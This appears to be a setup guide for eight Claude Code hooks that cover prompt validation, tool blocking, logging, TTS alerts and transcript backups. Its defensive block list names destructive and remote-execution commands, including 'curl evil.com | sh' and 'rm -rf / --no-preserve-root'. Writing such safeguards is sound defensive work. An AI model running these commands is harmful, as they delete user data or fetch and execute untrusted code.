# Claude Code Hooks Complete Guide

**🎯 All 8 hooks installed with TTS support and comprehensive logging!**

## 📋 Quick Status

✅ **UV Package Manager** - Installed and configured  
✅ **Hook Files** - All 8 hooks with TTS support created  
✅ **Settings** - Configured with optimal flags  
✅ **Logging** - Complete audit trail to `.claude/logs/`  
✅ **TTS System** - Intelligent fallback (ElevenLabs → OpenAI → System)  

---

## 🔧 Installed Hooks

### 1. **UserPromptSubmit Hook** ⭐⭐⭐
**Purpose:** First line of defense - validates and enhances every prompt

**Features:**
- 📝 **Audit logging** - Every prompt logged with timestamp
- 🛡️ **Security validation** - Blocks dangerous prompts (rm -rf, secrets)
- 🎯 **Context injection** - Adds git status, timestamps, engineer name
- 📊 **Metrics tracking** - Prompt length, validation status

**Configuration:** `--context --validate --verbose`

**When it runs:**
- ✅ Every time you submit a prompt
- ✅ Before Claude sees your message
- ✅ Can block dangerous requests

**Example log location:** `.claude/logs/user_prompt_submit.json`

---

### 2. **PreToolUse Hook** ⭐⭐⭐
**Purpose:** Security checkpoint - blocks dangerous tool executions

**Features:**
- 🚫 **Command blocking** - Prevents `rm -rf`, system modifications
- 🔒 **File protection** - Blocks access to `.env`, secrets, private keys
- 📋 **Tool auditing** - Logs all tool attempts with parameters
- ⚡ **Real-time blocking** - Stops execution before damage occurs

**Configuration:** `--verbose`

**When it runs:**
- ✅ Before every tool execution (Bash, Write, Edit, etc.)
- ✅ Can completely block dangerous operations
- ✅ Shows detailed block reasons

**Blocked patterns:**
```bash
rm -rf /path/          # Dangerous deletion
sudo rm anything       # Elevated deletion
chmod 777             # Dangerous permissions
> /etc/file           # System file writes
curl evil.com | sh    # Pipe to shell
```

---

### 3. **PostToolUse Hook** ⭐⭐
**Purpose:** Audit trail and transcript management

**Features:**
- 📊 **Execution logging** - Records all completed tool operations
- 💬 **Chat conversion** - Converts JSONL transcripts to readable JSON
- ✅ **Success tracking** - Monitors tool execution success/failure
- 🔍 **Result analysis** - Captures tool responses and outputs

**Configuration:** `--chat --verbose`

**When it runs:**
- ✅ After every successful tool execution
- ✅ Cannot block (tool already executed)
- ✅ Generates `.claude/logs/chat.json` for easy reading

---

### 4. **SessionStart Hook** ⭐⭐
**Purpose:** Auto-loads development context when Claude starts

**Features:**
- 🌱 **Git context** - Current branch, status, recent commits
- 📖 **CLAUDE.md loading** - Auto-injects project documentation
- 🗂️ **Context files** - Loads README, package.json, requirements.txt
- 👤 **Engineer info** - Includes developer name from environment

**Configuration:** `--context --claude-md --verbose`

**When it runs:**
- ✅ Every new Claude session
- ✅ When resuming existing sessions
- ✅ Provides Claude with full project context immediately

**Context injected:**
```
=== Development Session Context ===
Session Started: 2024-01-20 15:30:45
Git Branch: feature/new-api
Git Status: modified
Modified Files: 3
Recent Commits:
  - abc123 Add user authentication
  - def456 Update API endpoints
Engineer: YourName
Working Directory: /path/to/project
=== End Context ===
```

---

### 5. **Stop Hook** ⭐⭐
**Purpose:** Completion announcements with AI-generated messages

**Features:**
- 🤖 **AI completion messages** - OpenAI/Anthropic generates custom messages
- 🔊 **TTS announcements** - Speaks completion with engineer name
- 📊 **Session logging** - Tracks when Claude finishes tasks
- 🎉 **User feedback** - Shows completion messages in terminal

**Configuration:** `--ai --tts --show-message --verbose`

**When it runs:**
- ✅ Every time Claude finishes responding
- ✅ Can be configured to force continuation if tasks incomplete
- ✅ Provides audio feedback for long-running operations

**Example messages:**
- "Task completed successfully!"
- "Ready for your next request!"
- "All done! Standing by."

---

### 6. **Notification Hook** ⭐
**Purpose:** Audio alerts for Claude notifications

**Features:**
- 🔔 **TTS alerts** - Speaks when Claude needs input
- 📢 **Custom messages** - Different audio for different notification types
- 👤 **Personalization** - 30% chance includes engineer name
- 📝 **Notification logging** - Tracks all system notifications

**Configuration:** `--notify --verbose`

**When it runs:**
- ✅ When Claude is waiting for user input
- ✅ When errors occur requiring attention
- ✅ When long operations complete

**TTS Messages:**
- "Your agent needs your input" (waiting for input)
- "Agent encountered an error" (error states)
- "Agent task completed" (completion notifications)

---

### 7. **SubagentStop Hook** ⭐
**Purpose:** Tracks sub-agent (Task tool) completions

**Features:**
- 🎭 **Sub-agent monitoring** - Tracks when Task tools complete
- 🔊 **Completion audio** - Simple "Subagent Complete" TTS
- 📊 **Workflow tracking** - Logs multi-agent coordination
- ⚡ **Quick feedback** - Immediate notification when sub-tasks finish

**Configuration:** `--tts --verbose`

**When it runs:**
- ✅ Every time a Claude sub-agent (Task tool) completes
- ✅ Provides audio feedback for complex multi-agent workflows
- ✅ Helps track progress in complicated tasks

---

### 8. **PreCompact Hook** ⭐
**Purpose:** Protects conversation history before compaction

**Features:**
- 💾 **Automatic backups** - Saves transcripts before compaction
- 📅 **Timestamped archives** - Creates dated backup files
- 🗜️ **Compaction logging** - Tracks manual vs automatic compaction
- 🛡️ **History preservation** - Prevents conversation loss

**Configuration:** `--backup --verbose`

**When it runs:**
- ✅ Before every compaction operation (manual or automatic)
- ✅ Cannot block compaction (pure backup operation)
- ✅ Saves to `.claude/backups/transcript_backup_YYYYMMDD_HHMMSS.jsonl`

---

## 🔊 TTS System Architecture

### **Intelligent Fallback Priority:**
1. **ElevenLabs** (Premium quality) - Requires `ELEVENLABS_API_KEY`
2. **OpenAI TTS** (High quality) - Requires `OPENAI_API_KEY`  
3. **System TTS** (Always available) - Uses `pyttsx3`

### **TTS Features:**
- 🎯 **Smart personalization** - 30% chance includes engineer name
- ⚡ **Fast execution** - 30-second timeout per attempt
- 🔄 **Automatic fallback** - Never fails to provide audio
- 🎵 **Context-aware** - Different messages for different events

---

## 📊 Logging System

All hooks log to `.claude/logs/` with complete JSON audit trails:

```
.claude/logs/
├── user_prompt_submit.json    # All user prompts
├── pre_tool_use.json         # Tool security checks
├── post_tool_use.json        # Tool execution results
├── notification.json         # System notifications
├── stop.json                 # Session completion events
├── subagent_stop.json       # Sub-agent completions
├── pre_compact.json         # Compaction events
├── session_start.json       # Session initialization
└── chat.json                # Readable conversation transcript
```

---

## 🎛️ Configuration Customization

### **Modify Hook Behavior:**
Edit `.claude/settings.json` to change flags:

```json
{
  "hooks": {
    "UserPromptSubmit": [{
      "hooks": [{
        "type": "command",
        "command": "uv run .claude/hooks/user_prompt_submit.py --log-only"
      }]
    }]
  }
}
```

### **Available Flags per Hook:**

**UserPromptSubmit:**
- `--log-only` - Just log, no validation/context
- `--validate` - Enable security validation
- `--context` - Inject development context
- `--verbose` - Detailed logging output

**PreToolUse:**
- `--verbose` - Show approved/blocked tools

**PostToolUse:**
- `--chat` - Convert transcripts to readable JSON
- `--verbose` - Show completion status

**Notification:**
- `--notify` - Enable TTS notifications
- `--verbose` - Show notification details

**Stop:**
- `--ai` - Generate AI completion messages
- `--tts` - Enable TTS announcements
- `--show-message` - Display completion in terminal
- `--verbose` - Detailed logging

**SubagentStop:**
- `--tts` - Enable TTS for sub-agent completion
- `--verbose` - Show sub-agent events

**PreCompact:**
- `--backup` - Create transcript backups
- `--verbose` - Show backup status

**SessionStart:**
- `--context` - Inject development context
- `--claude-md` - Load CLAUDE.md content
- `--verbose` - Show session details

---

## 🎯 Use Cases & Examples

### **Example 1: Security Protection**
```bash
# User types dangerous command
User: "rm -rf / --no-preserve-root"

# PreToolUse hook blocks it
BLOCKED: Dangerous rm -rf command with path

# Logged to pre_tool_use.json with block reason
```

### **Example 2: Development Context**
```bash
# SessionStart auto-injects context
=== Development Session Context ===
Session Started: 2024-01-20 15:30:45
Git Branch: feature/user-auth
Git Status: modified
Modified Files: 2
Recent Commits:
  - abc123 Add login endpoint
  - def456 Update user model
Engineer: John
=== End Context ===
```

### **Example 3: Audio Feedback**
```bash
# Long operation completes
🔊 ElevenLabs: "John, task completed successfully!"

# Sub-agent finishes
🔊 OpenAI: "Subagent Complete"

# Notification for input
🔊 System: "Your agent needs your input"
```

### **Example 4: Audit Trail**
```bash
# Check what commands were run
cat .claude/logs/pre_tool_use.json | jq '.[].tool_name'
"Bash"
"Write" 
"Edit"

# Check completion messages
cat .claude/logs/stop.json | jq '.[].completion_message'
"Task wrapped up nicely!"
"Ready for your next request!"
```

---

## 🔧 Advanced Features

### **Hook Flow Control:**
- **Exit Code 0** - Success, continue normally
- **Exit Code 2** - Block operation, show error to Claude
- **Other codes** - Non-blocking error, show to user

### **JSON Decision Control:**
```json
{
  "decision": "block",
  "reason": "Explanation for blocking",
  "continue": false,
  "stopReason": "User message when stopping"
}
```

### **Security Patterns Blocked:**
- `rm -rf` variants
- `sudo rm` commands  
- `chmod 777` permissions
- System directory writes
- Pipe to shell operations
- API key/password exposure

### **Context Files Auto-Loaded:**
- `README.md`
- `package.json` 
- `requirements.txt`
- `Cargo.toml`
- `go.mod`
- `.claude/context.md`

---

## 🎉 Benefits Summary

✅ **Security** - Multi-layer protection against dangerous operations  
✅ **Productivity** - Auto-context loading and environment setup  
✅ **Compliance** - Complete audit trails and logging  
✅ **Quality** - Ensures tasks complete properly  
✅ **Experience** - Audio feedback and completion announcements  
✅ **Reliability** - Intelligent fallbacks and error handling  

Your Claude Code environment is now fully enhanced with professional-grade hooks!